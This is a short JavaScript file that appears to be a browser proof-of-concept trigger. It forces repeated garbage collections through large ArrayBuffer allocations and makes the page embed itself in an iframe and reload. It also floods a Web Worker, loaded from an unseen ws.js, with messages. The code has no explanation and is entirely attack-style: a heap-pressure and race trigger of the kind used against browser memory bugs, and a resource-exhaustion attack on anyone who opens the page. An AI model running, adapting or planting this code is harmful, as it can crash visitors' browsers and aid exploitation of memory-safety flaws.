var ref = new Array(1000000);
    var rid = 0;
    function major_gc() {
        new ArrayBuffer(0x7fe00000);
    }
    function minor_gc(n) {
        for (var i = 0; i < 32; i++) {
            ref[rid++] = new ArrayBuffer(0x200000);
        }
        ref[rid++] = new ArrayBuffer(1); // ram heuristic
    }
    function gc() {
        minor_gc();
        minor_gc();
        minor_gc();
        minor_gc();
        minor_gc();
        minor_gc();
        minor_gc();
        minor_gc();
        minor_gc();
        minor_gc();
        minor_gc();
        minor_gc();
        minor_gc();
        minor_gc();
        minor_gc();
        minor_gc();
        minor_gc();
        minor_gc();
        minor_gc();
        minor_gc();
        minor_gc();
        minor_gc();
        minor_gc();
        minor_gc();
    }
    function createIframe() {
        const iframe = document.createElement('iframe');
        iframe.src = window.location.href;
        document.body.appendChild(iframe);
    }
    createIframe();
    setTimeout(async function () {
        gc();
        location.reload();
    }, 6000);


    let worker = new Worker("./ws.js");
    for (let i = 0; i < 10000; i++) {
        worker.postMessage("xx");
    }